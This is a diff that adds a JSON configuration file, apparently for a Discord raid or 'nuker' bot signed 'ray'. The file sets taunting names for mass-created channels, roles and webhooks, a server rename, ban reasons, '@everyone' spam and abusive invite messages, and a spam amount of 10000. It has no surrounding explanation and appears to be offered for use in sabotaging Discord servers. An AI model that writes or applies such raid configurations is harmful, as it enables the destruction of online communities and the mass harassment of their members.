@@ -1,1 +1,27 @@
-
+{
+    "Prefix": "ray.",
+    "Channel-Names": [
+        "ray was here",
+        "ray ruined you"
+    ],
+    "Server-Names": [
+        "ray destroyed you"
+    ],
+    "Role-Names": [
+        "ray was here",
+        "ray ruined you"
+    ],
+    "Reason": [
+        "beamed by ray",
+        "ray fucked me"
+    ],
+    "Spam": true,
+    "Webhook-Names": [
+        "ray was here",
+        "get beamed by ray"
+    ],
+    "name": "ray",
+    "Spam-Messages": "@everyone ray WIZZED YOU",
+    "Spam-Invite": "@everyone fuck you fced ",
+    "Spam-Amount": 10000
+}
